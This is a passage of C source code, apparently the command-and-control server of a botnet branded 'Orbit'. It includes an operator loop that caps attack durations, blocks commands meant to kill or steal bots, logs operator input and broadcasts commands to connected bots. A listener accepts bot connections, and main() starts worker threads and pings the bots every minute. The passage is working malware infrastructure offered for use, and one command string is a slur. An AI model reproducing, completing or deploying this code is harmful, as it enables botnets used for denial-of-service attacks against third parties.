		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "4000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "5000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "6000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "7000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "8000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "9999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
      	if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        }
		if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
    	if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/time.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/kill.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "GTFOFAG")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/kill.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
        }//if you dont like this just take out common sense 
    	if(strstr(buf, "DUP")) 
		{  
	    printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/botkiller.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS %s\n", accounts[find_line].username, buf);
        fclose(logFile);
	    goto end;
		}
		if(strstr(buf, "dup")) 
		{  
		printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].username, buf);
		FILE *logFile;
        logFile = fopen("logfiles/smallbotkiller.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].username, buf);
        fclose(logFile);
		goto end;
				}
    	        trim(buf);
				char input [5000];
    		    sprintf(input, "\x1b[38;5;202m%s\x1b[97m@\x1b[38;5;202morbit\x1b[97m: \x1b[97m", accounts[find_line].username);
				if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
    	        if(strlen(buf) == 0) continue;
    	        printf("%s: \"%s\"\n",accounts[find_line].username, buf);
	
				FILE *LogFile;
    	        LogFile = fopen("logfiles/history.log", "a");
				time_t now;
				struct tm *gmt;
				char formatted_gmt [50];
				char lcltime[50];
				now = time(NULL);
				gmt = gmtime(&now);
				strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
    	        fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
    	        fclose(LogFile);
    	        broadcast(buf, datafd, accounts[find_line].username);
    	        memset(buf, 0, 2048);
        }

				end:
				managements[datafd].connected = 0;
				close(datafd);
				OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1)
    {
    	printf("Security Breach From: ");
		client_addr(cli_addr);
		FILE *logFile;
		logFile = fopen("logfiles/ip.log", "a");
		fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
		fclose(logFile);
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
    	if (newsockfd < 0) perror("ERROR on accept");
    	pthread_t thread;
    	pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
	}
}
int main (int argc, char *argv[], void *sock) {
		system("mkdir logfiles");
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		threads = atoi(argv[2]);
		if (threads > 850)
        {
            printf("Lower that mf threads lmao\n");
            return 0;
        }
        else if (threads < 850)
        {
            printf("good choice in threading\n");
        }
		printf("\x1b[1;90m[\x1b[97mOrbit\x1b[1;90m] \x1b[97mscreened succesfully\n");
        telFD = fopen("logfiles/telnet.txt", "a+");
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;																																																																																																											//bWFkZSBieSB4eHg=
}